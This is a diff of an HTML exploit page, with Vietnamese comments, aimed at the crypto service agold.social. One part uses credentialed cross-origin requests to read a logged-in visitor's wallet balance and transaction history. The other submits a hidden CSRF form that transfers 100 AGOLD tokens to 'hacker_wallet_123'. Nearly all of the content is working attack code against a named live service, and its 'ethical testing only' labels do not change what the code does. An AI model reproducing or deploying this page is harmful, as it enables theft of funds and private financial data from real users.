@@ -1,42 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Agold CORS Exploit PoC</title>
+  <title>Agold.social - CORS & CSRF Exploit PoC</title>
   <style>
-    body { font-family: Arial; text-align: center; margin-top: 50px; }
-    pre { background: #f4f4f4; padding: 15px; border-radius: 8px; text-align: left; display: inline-block; }
+    body { font-family: Arial; text-align: center; margin: 50px; }
+    button { padding: 10px 20px; margin: 10px; background: #d32f2f; color: white; border: none; cursor: pointer; }
+    button:hover { background: #b71c1c; }
+    pre { background: #f4f4f4; padding: 15px; border-radius: 8px; text-align: left; display: inline-block; max-width: 80%; }
     h1 { color: #d32f2f; }
+    .warning { color: red; font-weight: bold; }
   </style>
 </head>
 <body>
-  <h1>Agold.social - CORS Exploit Demo</h1>
-  <p>Đang gọi API từ <code>evil.com</code> → <code>gateway.agold.social</code>...</p>
-  <pre id="result">Đang tải...</pre>
+  <h1 class="warning">Agold.social Exploit Demo (Ethical Testing ONLY)</h1>
+  <p><small>Đăng nhập <code>agold.social</code> ở tab khác trước khi test!</small></p>
+
+  <!-- CORS Tests -->
+  <h2>1. Test CORS (Leak Data)</h2>
+  <button onclick="testCORS('/user/wallet')">Test Wallet Balance</button>
+  <button onclick="testCORS('/user/wallet/transaction-history')">Test Transaction History</button>
+  <pre id="corsResult">Click để test...</pre>
+
+  <!-- CSRF Tests -->
+  <h2>2. Test CSRF (Transfer Token)</h2>
+  <p class="warning">Nút dưới sẽ chuyển 100 AGOLD đến hacker_wallet nếu vuln!</p>
+  <button onclick="testCSRF()">EXPLOIT: Chuyển 100 AGOLD</button>
 
   <script>
-    // Gọi API profile (thay bằng endpoint thật nếu biết)
-    fetch('https://gateway.agold.social/api/v1/user/profile', {
-      method: 'GET',
-      credentials: 'include'  // Quan trọng: Gửi cookie nếu đang login
-    })
-    .then(r => {
-      document.getElementById('result').textContent = 'Status: ' + r.status + '\nResponse: Loading...';
-      return r.text();
-    })
-    .then(text => {
-      document.getElementById('result').textContent = 'Status: 200\nResponse:\n' + text;
-      console.log('API RESPONSE:', text);
-    })
-    .catch(err => {
-      document.getElementById('result').textContent = 'Error: ' + err;
-    });
+    // CORS Test Function
+    async function testCORS(endpoint) {
+      const url = `https://gateway.agold.social${endpoint}`;
+      const resultEl = document.getElementById('corsResult');
+      resultEl.textContent = `Testing ${url}...\n`;
 
-    // Thử gọi một path random để chứng minh catch-all
-    fetch('https://gateway.agold.social/this-path-does-not-exist-123', {
-      method: 'GET'
-    })
-    .then(r => r.json())
-    .then(data => console.log('Catch-all test:', data));
+      try {
+        const res = await fetch(url, {
+          method: 'GET',
+          credentials: 'include'  // Gửi cookie session
+        });
+        resultEl.textContent += `Status: ${res.status}\n`;
+        resultEl.textContent += `CORS Headers: ${JSON.stringify([...res.headers.entries()])}`;
+
+        if (res.ok) {
+          const data = await res.json();
+          resultEl.textContent += `\nSUCCESS! Data Leaked:\n${JSON.stringify(data, null, 2)}`;
+          alert('🚨 CORS VULN! Dữ liệu bị leak!');
+        }
+      } catch (err) {
+        resultEl.textContent += `Error: ${err.message}\n(CORS Blocked - An toàn!)`;
+      }
+    }
+
+    // CSRF Test Function
+    function testCSRF() {
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://gateway.agold.social/admin/wallet/transfer';
+      form.innerHTML = `
+        <input type="hidden" name="to" value="hacker_wallet_123">
+        <input type="hidden" name="amount" value="100">
+        <input type="hidden" name="token" value="AGOLD">
+      `;
+      document.body.appendChild(form);
+      form.submit();
+      alert('CSRF Triggered! Check ví agold.social...');
+    }
   </script>
+
+  <hr>
+  <p class="warning">Ethical only! Report vuln to agold.social if found.</p>
 </body>
 </html>
